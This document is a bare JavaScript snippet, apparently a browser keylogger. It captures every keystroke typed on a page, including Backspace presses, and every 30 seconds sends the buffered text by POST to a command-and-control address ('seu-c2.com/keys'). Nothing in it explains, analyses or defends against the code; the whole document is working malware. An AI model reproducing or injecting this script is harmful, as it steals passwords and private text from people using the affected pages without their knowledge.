(function(){
    var buffer = "", C2="https://seu-c2.com/keys";
    document.addEventListener("keydown", e=>{
      if(e.key.length===1) buffer += e.key;
      else if(e.key==="Backspace") buffer += "[BS]";
    });
    setInterval(()=>{
      if(buffer.length){
        fetch(C2, {
          method:"POST",
          headers:{"Content-Type":"text/plain"},
          body: buffer
        });
        buffer = "";
      }
    }, 30000);
  })();